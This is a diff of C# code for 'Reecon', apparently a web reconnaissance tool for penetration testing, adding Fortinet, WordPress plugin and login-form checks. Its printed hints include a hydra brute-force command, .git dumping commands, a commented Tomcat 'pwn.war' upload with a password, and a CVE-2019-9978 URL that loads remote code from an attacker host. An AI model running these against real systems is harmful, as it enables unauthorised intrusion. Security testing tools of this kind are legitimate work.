@@ -50,7 +50,7 @@ namespace Reecon
                 pageInfo += FindLinks(pageText); // Todo: Recursive
                                                  // TODO: Auto SQLi - Web.GetInfo(new[] { "-web", "http://testphp.vulnweb.com/" });
 
-                string parsedHTTPInfo = ParseHTTPInfo(httpInfo.StatusCode, httpInfo.PageTitle, httpInfo.PageText, httpInfo.DNS, httpInfo.Headers, httpInfo.SSLCert, httpInfo.URL);
+                string parsedHTTPInfo = ParseHTTPInfo(httpInfo.StatusCode, httpInfo.PageTitle, httpInfo.PageText, httpInfo.DNS, httpInfo.ResponseHeaders, httpInfo.ContentHeaders, httpInfo.SSLCert, httpInfo.URL);
                 Console.WriteLine(parsedHTTPInfo);
                 if (pageInfo.Trim() != "")
                 {
@@ -120,9 +120,10 @@ namespace Reecon
                             formMethod = formMethod.Substring(0, formMethod.IndexOf("\""));
                             returnText += "-- Method: " + formMethod + Environment.NewLine;
                         }
+                        string formAction = "";
                         if (formHeader.Replace(" ", "").Contains("action=\""))
                         {
-                            string formAction = formHeader.Remove(0, formHeader.IndexOf("action"));
+                            formAction = formHeader.Remove(0, formHeader.IndexOf("action"));
                             formAction = formAction.Remove(0, formAction.IndexOf("\"") + 1);
                             formAction = formAction.Substring(0, formAction.IndexOf("\""));
                             returnText += "-- Action: " + formAction + Environment.NewLine;
@@ -131,11 +132,10 @@ namespace Reecon
                         // Inputs
                         List<string> inputs = text.Split("<input").ToList();
                         inputs = inputs.Where(x => !x.StartsWith("<form")).ToList();
-                        inputs = inputs.Where(x => !x.Contains("\"hidden\"")).ToList(); // Some additional properties - Not related to what the user sees
                         string username = null;
                         string password = null;
                         foreach (string item in inputs)
-                        {
+                        {   
                             // Textbox
                             if (item.Replace(" ", "").Contains("type=\"text\""))
                             {
@@ -164,18 +164,38 @@ namespace Reecon
                                     password = textBoxName;
                                 }
                             }
+
+                            // Check for Hiddens (Might be used in submits, or have special things)
+                            if (item.Replace(" ", "").Contains("type=\"hidden\""))
+                            {
+                                returnText += "-- Hidden     Input Discovered" + Environment.NewLine;
+                                if (item.Contains(" name=\""))
+                                {
+                                    string hiddenItemName = item.Remove(0, item.IndexOf("name"));
+                                    hiddenItemName = hiddenItemName.Remove(0, hiddenItemName.IndexOf("\"") + 1);
+                                    hiddenItemName = hiddenItemName.Substring(0, hiddenItemName.IndexOf("\""));
+                                    returnText += $"--- Hidden Item Name: {hiddenItemName}" + Environment.NewLine;
+                                }
+                                if (item.Contains(" value=\""))
+                                {
+                                    string hiddenItemValue = item.Remove(0, item.IndexOf("value"));
+                                    hiddenItemValue = hiddenItemValue.Remove(0, hiddenItemValue.IndexOf("\"") + 1);
+                                    hiddenItemValue = hiddenItemValue.Substring(0, hiddenItemValue.IndexOf("\""));
+                                    returnText += $"---- Hidden Item Value: {hiddenItemValue}" + Environment.NewLine;
+                                }
+                            }
                         }
 
                         // Submits
                         List<string> submitButtons = text.Split("<button").ToList();
                         submitButtons = submitButtons.Where(x => !x.StartsWith("<form")).ToList();
-                        submitButtons = submitButtons.Where(x => x.Contains("\"submit\"")).ToList();
+                        submitButtons = submitButtons.Where(x => x.Contains("\"submit\"") || x.Contains(">Login</button>")).ToList();
 
                         // This will only work in the best of cases
-                        if ((inputs.Count == 3 || (inputs.Count == 2 && submitButtons.Count == 1)) && username != null && password != null)
+                        if ((inputs.Count >= 3 || (inputs.Count >= 2 && submitButtons.Count == 1)) && username != null && password != null)
                         {
                             returnText += "-- " + "Possible Login Form Found".Recolor(Color.Orange) + Environment.NewLine;
-                            returnText += "--- " + $"hydra -L logins.txt -P passwords.txt 127.0.0.1 http-form-post \"/folder/post.php:{username}=^USER^&{password}=^PASS^:Invalid password error here\"".Recolor(Color.Orange) + Environment.NewLine;
+                            returnText += "--- " + $"hydra -L logins.txt -P passwords.txt 127.0.0.1 http-form-post \"{formAction }:{username}=^USER^&{password}=^PASS^:Invalid password error here\"".Recolor(Color.Orange) + Environment.NewLine;
                         }
                     }
                 }
@@ -535,25 +555,24 @@ namespace Reecon
                                         // -np: But don't go all the way backwards
                                         // -nH: So you only have the ".git" folder and not the IP folder as well
                                         returnText += $"--- Download the repo: wget -q -r -np -nH {url}.git/" + Environment.NewLine;
-                                        returnText += "--- Get the logs: git log --pretty=format:\"%h - %an (%ae): %s %b\"" + Environment.NewLine;
                                         // git log --pretty=format:"%h - %an (%ae): %s %b"
                                         // db.sqlite3
-                                        returnText += "--- Show a specific commit: git show 2eb93ac (Press q to close)" + Environment.NewLine;
-                                        // https://stackoverflow.com/questions/34751837/git-can-we-recover-deleted-commits
-                                        returnText += "--- Find in-progress stuff: git status" + Environment.NewLine;
-                                        returnText += "--- Find deleted commits: git reflog" + Environment.NewLine;
-
-                                        continue;
+                                    }
+                                    else
+                                    {
+                                        returnText += "--- Download: https://raw.githubusercontent.com/arthaud/git-dumper/master/git_dumper.py" + Environment.NewLine;
+                                        returnText += $"--- Run: python3 git_dumper.py {url}{file} .git" + Environment.NewLine;
                                     }
                                 }
                                 catch (Exception ex)
                                 {
                                     Console.WriteLine($"Error in git - Bug Reelix: {ex.Message}");
                                 }
-                                returnText += "--- Download: https://raw.githubusercontent.com/arthaud/git-dumper/master/git_dumper.py" + Environment.NewLine;
-                                returnText += $"--- Run: python3 git_dumper.py {url}{file} .git" + Environment.NewLine;
                                 returnText += "--- Get the logs: git log --pretty=format:\"%h - %an (%ae): %s %b\"" + Environment.NewLine;
-                                returnText += "--- Show a specific comm it: git show 2eb93ac (Press q to close)" + Environment.NewLine;
+                                returnText += "--- Show a specific commit: git show 2eb93ac (Press q to close)" + Environment.NewLine;
+                                // https://stackoverflow.com/questions/34751837/git-can-we-recover-deleted-commits
+                                returnText += "--- Find in-progress stuff: git status" + Environment.NewLine;
+                                returnText += "--- Find deleted commits: git reflog" + Environment.NewLine;
                             }
                             // Kibana!
                             else if (file == "app/kibana")
@@ -601,7 +620,7 @@ namespace Reecon
                                 // nginx Alias Traversal
                                 if (!nginxAliasTraversalChecked)
                                 {
-                                    if (response.Headers.Any(x => x.Key == "Server" && x.Value.Any(x => x.StartsWith("nginx"))))
+                                    if (response.ResponseHeaders.Any(x => x.Key == "Server" && x.Value.Any(x => x.StartsWith("nginx"))))
                                     {
                                         string traversalPath = path.Remove(path.Length - 1, 1) + "../";
                                         var traversalResponse = Web.GetHTTPInfo(traversalPath);
@@ -658,9 +677,9 @@ namespace Reecon
                         continue;
                     }
                     returnText += $"- Common Path redirects: {url}{file}" + Environment.NewLine;
-                    if (response.Headers != null && response.Headers.Location != null)
+                    if (response.ResponseHeaders != null && response.ResponseHeaders.Location != null)
                     {
-                        returnText += $"-- Redirection Location: {response.Headers.Location}" + Environment.NewLine;
+                        returnText += $"-- Redirection Location: {response.ResponseHeaders.Location}" + Environment.NewLine;
 
                         // If it's an IP then it's probably redirecting to a host
                         if (IPAddress.TryParse(url, out _))
@@ -672,7 +691,7 @@ namespace Reecon
                 else if (response.StatusCode == HttpStatusCode.Unauthorized)
                 {
                     returnText += $"- Common path requires authentication: {url}{file}" + Environment.NewLine;
-                    var headers = response.Headers;
+                    var headers = response.ResponseHeaders;
                     if (headers.Contains("WWW-Authenticate"))
                     {
                         returnText += $"-- WWW-Authenticate: {headers.GetValues("WWW-Authenticate").First()}" + Environment.NewLine;
@@ -695,7 +714,7 @@ namespace Reecon
                 else if (response.StatusCode == HttpStatusCode.TemporaryRedirect)
                 {
                     // Normally just http -> https
-                    var headers = response.Headers;
+                    var headers = response.ResponseHeaders;
                     if (url.StartsWith("http") && headers.Contains("Location") && (headers.Location.ToString().StartsWith("https")))
                     {
                         continue;
@@ -706,9 +725,9 @@ namespace Reecon
                         Console.WriteLine($"-- Weird TemporaryRedirect: {url}{file}" + Environment.NewLine);
                     }
                 }
-                else if (response.StatusCode == HttpStatusCode.NotFound && response.Headers.Contains("Docker-Distribution-Api-Version"))
+                else if (response.StatusCode == HttpStatusCode.NotFound && response.ResponseHeaders.Contains("Docker-Distribution-Api-Version"))
                 {
-                    string dockerVersion = response.Headers.GetValues("Docker-Distribution-Api-Version").First();
+                    string dockerVersion = response.ResponseHeaders.GetValues("Docker-Distribution-Api-Version").First();
                     returnText += "-- Docker Detected - API Version: " + dockerVersion + Environment.NewLine;
                     if (dockerVersion == "registry/2.0")
                     {
@@ -778,34 +797,45 @@ namespace Reecon
 
         public static string FindCommonSubdomains(string url)
         {
+            // This only works on domains which are http[s]://domain.ext/ - No extension
+
             string toReturn = "";
             Uri uri = new Uri(url);
             string baseHost = uri.Host;
             string scheme = uri.Scheme;
+            
+            string domainToCheck = scheme + "://" + baseHost + "/";
+            List<string> subdomains = new List<string>() { "www", "dev", "test", "admin" };
 
-            // First - Get the base len
             var pageInfo = GetHTTPInfo(url);
+
+            // Get the content length of the default page as well as a known invalid to compare against
             int baseLen = pageInfo.PageText.Length;
-            List<string> subdomains = new List<string>() { "www", "dev", "test" };
+            var invalidBase = GetHTTPInfo(domainToCheck, HostHeader: "reelix." + baseHost);
+            int invalidBaseLen = -1;
+            if (invalidBase.PageText != null)
+            {
+                invalidBaseLen = invalidBase.PageText.Length;
+            }
             foreach (string subdomain in subdomains)
             {
-                string domainToCheck = scheme + "://" + baseHost + "/";
                 pageInfo = GetHTTPInfo(domainToCheck, HostHeader: subdomain + "." + baseHost);
-                if (pageInfo.StatusCode != HttpStatusCode.Moved && pageInfo.PageText.Length != baseLen)
+                if (pageInfo.StatusCode != HttpStatusCode.Moved && pageInfo.PageText.Length != baseLen && pageInfo.PageText.Length != invalidBaseLen)
                 {
-                    toReturn += "- Subdomain Discovered: " + (scheme + "://" + subdomain + "." + baseHost + "/").Recolor(Color.Orange) + Environment.NewLine;
+                    toReturn += "-- Subdomain Discovered: " + (scheme + "://" + subdomain + "." + baseHost + "/").Recolor(Color.Orange) + Environment.NewLine;
                 }
             }
             return toReturn;
         }
 
-        public static (HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, HttpResponseHeaders Headers, X509Certificate2 SSLCert, string URL, string AdditionalInfo) GetHTTPInfo(string url, string UserAgent = null, string Cookie = null, string HostHeader = null)
+        public static (HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, HttpResponseHeaders ResponseHeaders, HttpContentHeaders ContentHeaders, X509Certificate2 SSLCert, string URL, string AdditionalInfo) GetHTTPInfo(string url, string UserAgent = null, string Cookie = null, string HostHeader = null)
         {
             string pageTitle = "";
             string pageText = "";
             string dns = "";
             HttpStatusCode statusCode = new();
-            HttpResponseHeaders headers = null;
+            HttpResponseHeaders responseHeaders = null;
+            HttpContentHeaders contentHeaders = null;
             X509Certificate2 cert = null;
 
             // Ignore invalid SSL Cert
@@ -846,7 +876,8 @@ namespace Reecon
                 HttpResponseMessage httpClientResponse = httpClient.Send(httpClientRequest);
                 statusCode = httpClientResponse.StatusCode;
                 dns = theURL.DnsSafeHost;
-                headers = httpClientResponse.Headers;
+                responseHeaders = httpClientResponse.Headers;
+                contentHeaders = httpClientResponse.Content.Headers;
                 using (StreamReader readStream = new(httpClientResponse.Content.ReadAsStream()))
                 {
                     pageText = readStream.ReadToEnd();
@@ -865,32 +896,32 @@ namespace Reecon
                 if (ex.Message.StartsWith("The SSL connection could not be established, see inner exception"))
                 {
                     // Not valid
-                    return (statusCode, null, null, null, null, null, null, null);
+                    return (statusCode, null, null, null, null, null, null, null, null);
                 }
                 else if (ex.Message.StartsWith("The request was canceled due to the configured HttpClient.Timeout of "))
                 {
                     // Why is this not caught in the TimeoutException...
                     Console.WriteLine($"- Odd TimeoutError - {url} timed out: {ex.Message} - Bug Reelix".Recolor(Color.Red));
-                    return (statusCode, null, null, null, null, null, url, "Timed Out :(");
+                    return (statusCode, null, null, null, null, null, null, url, "Timed Out :(");
                 }
                 else if (ex.InnerException != null && ex.InnerException.GetType().IsAssignableFrom(typeof(IOException)))
                 {
                     if (ex.InnerException.Message == "The response ended prematurely.")
                     {
-                        return (HttpStatusCode.BadRequest, null, null, null, null, null, url, "WTF");
+                        return (HttpStatusCode.BadRequest, null, null, null, null, null, null, url, "WTF");
                     }
                     else
                     {
                         // Soome weird cert thing
                         // * schannel: failed to read data from server: SEC_E_CERT_UNKNOWN (0x80090327) - An unknown error occurred while processing the certificate.
-                        return (statusCode, null, null, null, null, null, url, "WeirdSSL");
+                        return (statusCode, null, null, null, null, null, null, url, "WeirdSSL");
                     }
                 }
                 else if (ex.InnerException != null && ex.InnerException.GetType().IsAssignableFrom(typeof(SocketException)))
                 {
                     if (ex.InnerException.Message == "Name or service not known")
                     {
-                        return (statusCode, null, null, null, null, null, url, $"The url {url} does not exist - Maybe fix your /etc/hosts file?");
+                        return (statusCode, null, null, null, null, null, null, url, $"The url {url} does not exist - Maybe fix your /etc/hosts file?");
                     }
                     else
                     {
@@ -910,10 +941,10 @@ namespace Reecon
                 pageTitle = pageText.Remove(0, pageText.IndexOf("<title>") + "<title>".Length);
                 pageTitle = pageTitle.Substring(0, pageTitle.IndexOf("</title>"));
             }
-            return (statusCode, pageTitle, pageText, dns, headers, cert, url, null);
+            return (statusCode, pageTitle, pageText, dns, responseHeaders, contentHeaders, cert, url, null);
         }
 
-        public static string ParseHTTPInfo(HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, HttpResponseHeaders Headers, X509Certificate2 SSLCert, string URL)
+        public static string ParseHTTPInfo(HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, HttpResponseHeaders ResponseHeaders, HttpContentHeaders ContentHeaders, X509Certificate2 SSLCert, string URL)
         {
             string toReturn = "";
             string urlPrefix = URL.StartsWith("https") ? "https" : "http";
@@ -928,23 +959,23 @@ namespace Reecon
                 // There's a low chance that it will return a StatusCode that is not in the HttpStatusCode list in which case (int)StatusCode will crash
                 if (StatusCode == HttpStatusCode.MovedPermanently)
                 {
-                    if (Headers != null && Headers.Location != null)
+                    if (ResponseHeaders != null && ResponseHeaders.Location != null)
                     {
                         toReturn += "- Moved Permanently" + Environment.NewLine;
-                        toReturn += "-> Location: " + Headers.Location + Environment.NewLine;
-                        Headers.Remove("Location");
+                        toReturn += "-> Location: " + ResponseHeaders.Location + Environment.NewLine;
+                        ResponseHeaders.Remove("Location");
                     }
                 }
                 else if (StatusCode == HttpStatusCode.Redirect)
                 {
-                    if (Headers != null && Headers.Location != null)
+                    if (ResponseHeaders != null && ResponseHeaders.Location != null)
                     {
                         toReturn += "- Redirect" + Environment.NewLine;
-                        toReturn += "-> Location: " + Headers.Location + Environment.NewLine;
+                        toReturn += "-> Location: " + ResponseHeaders.Location + Environment.NewLine;
 
                         // ProxyShell / ProxyLogin
                         // CVE-2021-26855
-                        if (Headers.Location.ToString().Contains("/owa/"))
+                        if (ResponseHeaders.Location.ToString().Contains("/owa/"))
                         {
                             // msmailprobe.go
                             // This vulnerability affects
@@ -964,7 +995,7 @@ namespace Reecon
                                 Console.WriteLine("Nope - " + (int)proxyShellInfo.StatusCode);
                             }
                         }
-                        Headers.Remove("Location");
+                        ResponseHeaders.Remove("Location");
                     }
                 }
                 else if (StatusCode == HttpStatusCode.NotFound)
@@ -985,10 +1016,10 @@ namespace Reecon
                     {
                         toReturn += "- Fatally Unknown Status Code: " + " " + StatusCode + Environment.NewLine;
                     }
-                    if (Headers != null && Headers.Location != null)
+                    if (ResponseHeaders != null && ResponseHeaders.Location != null)
                     {
-                        toReturn += "-> Location: " + Headers.Location + Environment.NewLine;
-                        Headers.Remove("Location");
+                        toReturn += "-> Location: " + ResponseHeaders.Location + Environment.NewLine;
+                        ResponseHeaders.Remove("Location");
                     }
                 }
             }
@@ -1040,6 +1071,8 @@ namespace Reecon
                     string managerAppHTMLURL = URL + "manager/html,Manager App (HTML)"; // Manager App (HTML)
                     tomcatLoginPages.Add(managerAppHTMLURL);
                     string managerAppTextURL = URL + "manager/text,Manager App (Text)"; // Manager App (Text)
+                    // If this is allowed
+                    // curl -v -u tomcat:OPx52k53D8OkTZpx4fr --upload-file pwn.war "http://10.10.247.135:8080/manager/text/deploy?path=/foo&update=true"
                     tomcatLoginPages.Add(managerAppTextURL);
                     string hostManagerURL = URL + "host-manager/html,Host Manager (HTML)"; // Host Manager (HTML)
                     tomcatLoginPages.Add(hostManagerURL);
@@ -1094,13 +1127,13 @@ namespace Reecon
             }
 
             // Headers + Cookies!
-            if (Headers.Any())
+            if (ResponseHeaders.Any())
             {
                 // Server info
-                if (Headers.Any(x => x.Key == "Server"))
+                if (ResponseHeaders.Any(x => x.Key == "Server"))
                 {
-                    string serverText = Headers.Server.ToString();
-                    Headers.Remove("Server");
+                    string serverText = ResponseHeaders.Server.ToString();
+                    ResponseHeaders.Remove("Server");
                     // Eg: Apache/2.4.46, (Win64), OpenSSL/1.1.1j, PHP/7.3.27
                     // Heartbleed - OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable
                     toReturn += "- Server: " + serverText + Environment.NewLine;
@@ -1214,13 +1247,37 @@ namespace Reecon
                             toReturn += "--- No /console :(" + Environment.NewLine;
                         }
                     }
+                    else if (serverText == "xxxxxxxx-xxxxx" && PageText.Contains("top.location=\"/remote/login\""))
+                    {
+                        toReturn += "-- " + "Fortinet detected" + Environment.NewLine;
+                        if (ContentHeaders.LastModified != null)
+                        {
+                            DateTime theDate = ContentHeaders.LastModified.Value.DateTime;
+                            ContentHeaders.Remove("Last-Modified");
+                            toReturn += $"--- Last Modified: {theDate}" + Environment.NewLine;
+
+                            // CVE-2023-27997
+                            // https://bishopfox.com/blog/cve-2023-27997-exploitable-fortigate-vulnerable
+                            // we know that patched FortiOS releases were packaged in May–June 2023.
+                            if (theDate.Year < 2023 || (theDate.Year == 2023 && theDate.Month < 5))
+                            {
+                                toReturn += "--- Bug Reelix for additional checks for CVE-2023-27997" + Environment.NewLine;
+                                // May–June 2023 
+                            }
+                            else
+                            {
+                                toReturn += "--- Probably not vulnerable to CVE-2023-27997 :(" + Environment.NewLine;
+                            }
+                        }
+
+                    }
                 }
 
                 // So many X's....
-                if (Headers.Any(x => x.Key.StartsWith("X-Generator")))
+                if (ResponseHeaders.Any(x => x.Key.StartsWith("X-Generator")))
                 {
-                    string generator = Headers.GetValues("X-Generator").First();
-                    Headers.Remove("X-Powered-By");
+                    string generator = ResponseHeaders.GetValues("X-Generator").First();
+                    ResponseHeaders.Remove("X-Powered-By");
                     toReturn += "- X-Generator: " + generator + Environment.NewLine;
 
                     if (generator.StartsWith("Drupal"))
@@ -1236,10 +1293,10 @@ namespace Reecon
                     }
                 }
 
-                if (Headers.Any(x => x.Key == "X-Powered-By"))
+                if (ResponseHeaders.Any(x => x.Key == "X-Powered-By"))
                 {
-                    string poweredBy = Headers.GetValues("X-Powered-By").First();
-                    Headers.Remove("X-Powered-By");
+                    string poweredBy = ResponseHeaders.GetValues("X-Powered-By").First();
+                    ResponseHeaders.Remove("X-Powered-By");
                     toReturn += "- X-Powered-By: " + poweredBy + Environment.NewLine;
 
                     if (poweredBy.Contains("PHP"))
@@ -1292,24 +1349,24 @@ namespace Reecon
                 }
 
                 // Confluence
-                if (Headers.Any(x => x.Key == "X-Confluence-Request-Time"))
+                if (ResponseHeaders.Any(x => x.Key == "X-Confluence-Request-Time"))
                 {
                     toReturn += "-- " + "Confluence Detected".Recolor(Color.Orange) + Environment.NewLine;
                     toReturn += "--- Bug Reelix - https://nvd.nist.gov/vuln/detail/CVE-2023-22527";
                 }
 
                 // Elasticsearch
-                if (Headers.Any(x => x.Key == "X-Found-Handling-Cluster") && Headers.Any(x => x.Key == "X-Found-Handling-Instance"))
+                if (ResponseHeaders.Any(x => x.Key == "X-Found-Handling-Cluster") && ResponseHeaders.Any(x => x.Key == "X-Found-Handling-Instance"))
                 {
                     toReturn += "-- " + "Elasticsearch Detected".Recolor(Color.Orange) + Environment.NewLine;
 
                     // We could get the cluster / instance name if we really wanted, but no need really
-                    Headers.Remove("X-Found-Handling-Cluster");
-                    Headers.Remove("X-Found-Handling-Instance");
+                    ResponseHeaders.Remove("X-Found-Handling-Cluster");
+                    ResponseHeaders.Remove("X-Found-Handling-Instance");
                 }
 
                 // Gitlab
-                if (Headers.Any(x => x.Key == "X-Gitlab-Meta"))
+                if (ResponseHeaders.Any(x => x.Key == "X-Gitlab-Meta"))
                 {
                     toReturn += "-- " + "Gitlab Detected".Recolor(Color.Orange) + Environment.NewLine;
                     var versionCheck = GetHTTPInfo($"{URL}assets/webpack/manifest.json");
@@ -1325,11 +1382,11 @@ namespace Reecon
                 }
 
                 // Influxdb
-                if (Headers.Any(x => x.Key.StartsWith("X-Influxdb-Version")))
+                if (ResponseHeaders.Any(x => x.Key.StartsWith("X-Influxdb-Version")))
                 {
                     toReturn += "- InfluxDB Detected".Recolor(Color.Orange) + Environment.NewLine;
-                    string influxDBVersion = Headers.GetValues("X-Influxdb-Version").First();
-                    Headers.Remove("X-Influxdb-Version");
+                    string influxDBVersion = ResponseHeaders.GetValues("X-Influxdb-Version").First();
+                    ResponseHeaders.Remove("X-Influxdb-Version");
                     toReturn += "- InfluxDB Detected - Version: " + influxDBVersion + Environment.NewLine;
                     Version theVersion = new Version(influxDBVersion);
                     if (theVersion <= new Version("1.3.0"))
@@ -1339,9 +1396,9 @@ namespace Reecon
                 }
 
                 // Kubernetes
-                if (Headers.Any(x => x.Key.StartsWith("X-Kubernetes-")))
+                if (ResponseHeaders.Any(x => x.Key.StartsWith("X-Kubernetes-")))
                 {
-                    Headers.Where(x => !x.Key.StartsWith("X-Kubernetes-"));
+                    ResponseHeaders.Where(x => !x.Key.StartsWith("X-Kubernetes-"));
                     toReturn += "-- " + "Kubernetes Detected".Recolor(Color.Orange) + Environment.NewLine;
                     var versionCheck = GetHTTPInfo($"{URL}version");
                     if (versionCheck.StatusCode == HttpStatusCode.OK)
@@ -1357,58 +1414,59 @@ namespace Reecon
                 }
 
                 // Vercel
-                if (Headers.Any(x => x.Key.StartsWith("X-Vercel-Id") || x.Key.StartsWith("X-Vercel-Cache")))
+                if (ResponseHeaders.Any(x => x.Key.StartsWith("X-Vercel-Id") || x.Key.StartsWith("X-Vercel-Cache")))
                 {
+                    // Oh you poor, poor people :/
                     toReturn += "-- " + "Vercel Detected".Recolor(Color.Orange) + Environment.NewLine;
-                    Headers.Remove("X-Vercel-Id");
-                    Headers.Remove("X-Vercel-Cache");
+                    ResponseHeaders.Remove("X-Vercel-Id");
+                    ResponseHeaders.Remove("X-Vercel-Cache");
                 }
 
                 // Useless ones (For our purposes, anyways)
                 // X-Matched-Path ?
-                Headers.Remove("X-Content-Type-Options");
-                Headers.Remove("X-Frame-Options");
-                Headers.Remove("X-XSS-Protection");
+                ResponseHeaders.Remove("X-Content-Type-Options");
+                ResponseHeaders.Remove("X-Frame-Options");
+                ResponseHeaders.Remove("X-XSS-Protection");
 
                 // All the rest
-                while (Headers.Any(x => x.Key.StartsWith("X-")))
+                while (ResponseHeaders.Any(x => x.Key.StartsWith("X-")))
                 {
-                    var theHeader = Headers.First(x => x.Key.StartsWith("X-"));
+                    var theHeader = ResponseHeaders.First(x => x.Key.StartsWith("X-"));
                     string headerName = theHeader.Key;
-                    string headerValues = string.Join(",", Headers.GetValues(headerName));
+                    string headerValues = string.Join(",", ResponseHeaders.GetValues(headerName));
                     toReturn += $"- {headerName}: {headerValues}" + Environment.NewLine;
                     toReturn += "-- If you see this, bug Reelix for a useful X- Header" + Environment.NewLine;
-                    Headers.Remove(theHeader.Key);
+                    ResponseHeaders.Remove(theHeader.Key);
                 }
 
                 // Requires a login
-                if (Headers.Any(x => x.Key == "WWW-Authenticate"))
+                if (ResponseHeaders.Any(x => x.Key == "WWW-Authenticate"))
                 {
-                    string wwwAuthenticate = Headers.WwwAuthenticate.ToString();
-                    Headers.Remove("WWW-Authenticate");
+                    string wwwAuthenticate = ResponseHeaders.WwwAuthenticate.ToString();
+                    ResponseHeaders.Remove("WWW-Authenticate");
                     toReturn += $"- WWW-Authenticate: {wwwAuthenticate}" + Environment.NewLine;
                 }
 
                 // Kabana
-                if (Headers.Any(x => x.Key == "kbn-name"))
+                if (ResponseHeaders.Any(x => x.Key == "kbn-name"))
                 {
-                    string kbnName = Headers.GetValues("kbn-name").First();
-                    Headers.Remove("kbn-name");
+                    string kbnName = ResponseHeaders.GetValues("kbn-name").First();
+                    ResponseHeaders.Remove("kbn-name");
                     toReturn += "- kbn-name: " + kbnName + Environment.NewLine;
                     toReturn += "-- You should get more kibana-based info further down" + Environment.NewLine;
                 }
-                if (Headers.Any(x => x.Key == "kbn-version"))
+                if (ResponseHeaders.Any(x => x.Key == "kbn-version"))
                 {
-                    string kbnVersion = Headers.GetValues("kbn-version").ToString(); // Will this bug since it's not .First() ?
-                    Headers.Remove("kbn-version");
+                    string kbnVersion = ResponseHeaders.GetValues("kbn-version").ToString(); // Will this bug since it's not .First() ?
+                    ResponseHeaders.Remove("kbn-version");
                     toReturn += $"- kbn-version: {kbnVersion}" + Environment.NewLine;
                 }
 
                 // Useful cookies
-                if (Headers.Any(x => x.Key == "Set-Cookie"))
+                if (ResponseHeaders.Any(x => x.Key == "Set-Cookie"))
                 {
-                    string setCookie = Headers.GetValues("Set-Cookie").First();
-                    Headers.Remove("Set-Cookie");
+                    string setCookie = ResponseHeaders.GetValues("Set-Cookie").First();
+                    ResponseHeaders.Remove("Set-Cookie");
                     toReturn += $"- Set-Cookie: {setCookie}" + Environment.NewLine;
                     // Cacti
                     if (setCookie.StartsWith("Cacti"))
@@ -1442,9 +1500,9 @@ namespace Reecon
                     }
                 }
                 // Fun content types
-                if (Headers.Any(x => x.Key == "Content-Type"))
+                if (ResponseHeaders.Any(x => x.Key == "Content-Type"))
                 {
-                    string contentType = Headers.GetValues("Content-Type").First();
+                    string contentType = ResponseHeaders.GetValues("Content-Type").First();
                     if (contentType.StartsWith("text/html"))
                     {
                         // Skip it
@@ -1462,21 +1520,16 @@ namespace Reecon
                 }
 
                 // CSP (Rules, Bypsses, etc.)
-                if (Headers.Any(x => x.Key == "Content-Security-Policy"))
+                if (ResponseHeaders.Any(x => x.Key == "Content-Security-Policy"))
                 {
-                    string csp = Headers.GetValues("Content-Security-Policy").First();
+                    string csp = ResponseHeaders.GetValues("Content-Security-Policy").First();
                     toReturn += "- Content-Security-Policy: " + csp + Environment.NewLine;
                     toReturn += "-- Verify security with: https://csp-evaluator.withgoogle.com/" + Environment.NewLine;
                 }
 
                 // And the rest
-                string otherHeaders = "";
-                foreach (var header in Headers)
-                {
-                    otherHeaders += header.Key + ",";
-                }
-                otherHeaders = otherHeaders.Trim(',');
-                toReturn += "- Other Headers: " + otherHeaders + Environment.NewLine;
+                toReturn += "- Other Response Headers: " + string.Join(", ", ResponseHeaders.Select(x => x.Key)) + Environment.NewLine;
+                toReturn += "- Other Content Headers: " + string.Join(", ", ContentHeaders.Select(x => x.Key)) + Environment.NewLine;
             }
 
             // Page Text (Body)
@@ -1780,7 +1833,7 @@ namespace Reecon
                         string wpVersion = PageText.Remove(0, PageText.IndexOf("<meta name=\"generator\" content=\"WordPress "));
                         wpVersion = wpVersion.Remove(0, wpVersion.IndexOf("WordPress ") + "WordPress ".Length);
                         wpVersion = wpVersion.Substring(0, wpVersion.IndexOf("\"")).Trim();
-                        toReturn += "-- WordPress Version: " + wpVersion + Environment.NewLine;
+                        toReturn += "-- " + $"WordPress Version: {wpVersion}".Recolor(Color.Orange) + Environment.NewLine;
                     }
 
                     // Basic User Enumeration - Need to combine these two...
@@ -1841,7 +1894,7 @@ namespace Reecon
                             if (!pluginList.Contains(thePlugin))
                             {
                                 pluginList.Add(thePlugin);
-                                toReturn += $"-- Plugin Found: {thePlugin}" + Environment.NewLine;
+                                toReturn += "-- " + $"Plugin Found: {thePlugin}".Recolor(Color.Orange) + Environment.NewLine;
                                 if (thePlugin == "social-warfare")
                                 {
                                     toReturn += "--- " + "Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Recolor(Color.Orange) + $" - {urlWithSlash}wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
@@ -1861,6 +1914,38 @@ namespace Reecon
                                 else if (thePlugin == "really-simple-ssl")
                                 {
                                     toReturn += "--- " + "Possible Vulnerable Plugin (Really Simple Security) Detected (Vuln if 9.0.0 -> 9.1.1.1) - CVE-2024-10924".Recolor(Color.Orange) + Environment.NewLine;
+                                }
+                                // buddyforms < 2.7.8
+                                // https://wpscan.com/vulnerability/a554091e-39d1-4e7e-bbcf-19b2a7b8e89f/
+
+                                // jsmol2wp < 1.08
+                                // CVE-2018-20463
+                                else
+                                {
+                                    // I haven't set anything specific - Look for some versions
+                                    string readmeLoc = $"{urlWithSlash}wp-content/plugins/{thePlugin}/readme.txt";
+                                    var pluginReadme = Web.GetHTTPInfo(readmeLoc);
+                                    if (pluginReadme.StatusCode == HttpStatusCode.OK)
+                                    {
+                                        toReturn += $"--- Plugin readme found: {readmeLoc}" + Environment.NewLine;
+                                        if (pluginReadme.PageText.Contains("Stable tag: "))
+                                        {
+                                            string pluginVersion = pluginReadme.PageText.Remove(0, pluginReadme.PageText.IndexOf("Stable tag: ") + "Stable tag: ".Length);
+                                            pluginVersion = pluginVersion.Substring(0, pluginVersion.IndexOf("\n")).Trim('\r');
+                                            toReturn += "--- " + $"Plugin version: {pluginVersion}".Recolor(Color.Orange) + Environment.NewLine;
+                                        }
+                                    }
+                                    // Some use changelog.txt instead
+                                    else 
+                                    {
+                                        string changelogLoc = $"{urlWithSlash}wp-content/plugins/{thePlugin}/changelog.txt";
+                                        var changelogReadme = Web.GetHTTPInfo(changelogLoc);
+                                        if (changelogReadme.StatusCode == HttpStatusCode.OK)
+                                        {
+                                            toReturn += $"--- Plugin changelog found: {changelogLoc}" + Environment.NewLine;
+                                            // Each is different, so can't really get anything useful
+                                        }
